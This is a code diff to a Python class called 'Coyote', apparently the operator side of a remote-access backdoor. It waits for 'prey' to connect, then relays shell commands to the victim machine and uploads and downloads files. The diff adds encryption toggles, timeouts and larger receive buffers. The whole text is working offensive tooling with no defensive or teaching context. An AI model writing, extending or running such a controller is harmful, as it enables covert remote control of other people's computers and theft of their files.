@@ -18,6 +18,7 @@ class Coyote:
             if(printing):
                 print("Waiting for prey");
             self.conn, addr = self.sock.accept();
+            self.conn.settimeout(0.0);
             if(printing):
                 print("They prey has connected");
     def shell(self):
@@ -29,20 +30,28 @@ class Coyote:
             elif(cmd[:4] == "send"):
                 self.sendFile(cmd[5:]);
             else:
-                self.send(cmd);
-                self.recv();
+                self.send(cmd, encrypt=False);
+                self.recv(decrypt=False, b=2048);
         self.conn.close();
 
-    def send(self, msj):
-        #if(type(msj) != type(b"byte")):
-        #    msj = str(msj).encode();
-        #msj = self.f.encrypt(msj);
-        self.conn.send(msj.encode());
+    def send(self, msj, encrypt=True):
+        if(type(msj) != type(b"byte")):
+            msj = str(msj).encode();
+        if(encrypt):
+            msj = self.f.encrypt(msj);
+        self.conn.send(msj);
     def getFile(self, file):
         with open(file, "wb") as f:
-            content = self.conn.recv(1024);
-            f.write(content);
-        print("Done!");
+            try:
+                self.conn.settimeout(10);
+                content = self.recv(decode=False, decrypt=False, b=10240);
+            except Exception as e:
+                print(e);
+            else:
+                f.write(content);
+            finally:
+                self.conn.settimeout(0.0);
+
     def sendFile(self, file):
         try:
             with open(file,"rb") as f:
@@ -50,12 +59,20 @@ class Coyote:
         except FileNotFoundError:
             print("File not found.");
         else:
-            self.send(content);
-    def recv(self):
-        msj = self.conn.recv(1024).decode();
-        #msj = self.f.decrypt(msj).decode();
-        print(msj);
-
+            self.send(content, encrypt=False );
+    def recv(self, prnt = True, decode = True, decrypt = True, b=1024):
+        try:
+            msj = self.conn.recv(b);
+        except:
+            return 0;
+        else:
+            if(decrypt):
+                msj = self.f.decrypt(msj);
+            if(decode):
+                msj = msj.decode();
+            if(prnt):
+                print(msj);
+            return msj;
 
 
 
